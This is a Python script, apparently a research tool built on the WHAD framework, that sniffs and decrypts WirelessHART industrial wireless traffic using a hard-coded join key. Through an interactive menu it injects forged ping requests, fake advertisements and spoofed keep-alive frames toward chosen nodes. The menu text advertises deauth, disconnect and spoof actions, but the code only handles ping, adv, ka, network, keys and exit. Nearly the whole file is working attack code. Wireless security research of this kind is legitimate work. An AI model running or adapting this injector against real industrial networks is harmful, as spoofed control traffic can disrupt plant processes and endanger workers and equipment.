import sys
import threading
import logging
from time import sleep

from scapy.config import conf
from scapy.all import BrightTheme

from whad.wihart.connector.injector import Injector
from whad.device import WhadDevice
from whad.exceptions import WhadDeviceNotFound
from whad.wihart.exceptions import MissingCryptographicMaterial
from whad.wihart.connector.sniffer import Sniffer
from whad.scapy.layers.wirelesshart import WirelessHart_DataLink_Advertisement

conf.color_theme = BrightTheme()
logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")

def cli_interaction_worker(injector_instance):
  
    print("\n\033[92m[+] Connection and TSCH synchronization established. Interactive mode ready.\033[0m")
    
    while True:
        try:
            print("\n" + "="*40)
            print(f"[-] Current Stack ASN: {injector_instance.network.asn if injector_instance.network else 'Unknown'}")
            print(f"[-] Active spoofed nodes: {list(injector_instance.spoofed_nodes)}")
            print("="*40)
            
            cmd = input("Actions: [ping] [deauth] [disconnect] [spoof] [exit]\nChoice > ").strip().lower()
            if cmd == "network":
                print(injector_instance.network)
            elif cmd == "keys":
                print(injector_instance.encryptor)
            elif cmd == "ping":
                dst = int(input("Target node (ID) > "))
                graph = int(input("Graph ID > "))
                wait_offset = int(input("Wait offset > "))
                print("[*] Injecting ping_request...")

                dev.set_connector(injector_instance)
                injector_instance.ping_request(dst, graph=graph, wait_offset=wait_offset)
                dev.set_connector(sniffer)

            elif cmd == "adv":
                dst = int(input("Target node (ID) > "))
                wait = int(input("Wait offset > "))
                print("[*] Injecting advertisement...")

                dev.set_connector(injector_instance)
                injector_instance.send_fake_advertisement(dst, channel_map=1, superframes=[], wait_offset=wait)
                dev.set_connector(sniffer)

            elif cmd == "ka":
                dst = int(input("Target node (ID) > "))
                
                dev.set_connector(injector_instance)
                injector_instance.send_keep_alive(0x1, dst)
                dev.set_connector(sniffer)
                
                print(f"Injecting a fake eep alive from 1 to {dst}")
                
            elif cmd == "exit":
                print("[*] Exiting...")
                break

        except ValueError:
            print("\033[91m[!] Error: Invalid numerical input.\033[0m")
        except Exception as e:
            print(f"\033[91m[!] Injection error: {e}\033[0m")

if __name__ == '__main__':
    sniffer = None
    injector = None
    dev = None

    if len(sys.argv) < 3:
        print(f"Usage: python {sys.argv[0]} <interface> <channel> ")
        sys.exit(1)

    interface = sys.argv[1]
    channel = int(sys.argv[2])
    
    try:
        dev = WhadDevice.create(interface)
        sniffer = Sniffer(dev)
        key_store = sniffer.decryptor.get_store()
        injector = Injector(dev, store=key_store)
        injector.network = sniffer.network

        dev.set_connector(sniffer)
        
        sniffer.channel = channel
        sniffer.add_join_key(b"ABCDABCDABCDABCD")
        sniffer.decrypt = True
        injector.spoofed_nodes = set()

        sniffer.start()
        sniffer.enable_tsch()

        cli_thread = threading.Thread(target=cli_interaction_worker, args=(injector,), daemon=True)
        cli_thread.start()

        for pkt in sniffer.sniff():
            if WirelessHart_DataLink_Advertisement not in pkt:
                print(pkt.metadata, repr(pkt))
            
    except WhadDeviceNotFound:
        print(f"[e] Device '{interface}' not found.")
    except (KeyboardInterrupt, SystemExit):
        print("\n[-] Program stopped.")
    finally:
        try:
            if sniffer is not None:
                sniffer.stop()
            if dev is not None:
                dev.close()
        except:
            pass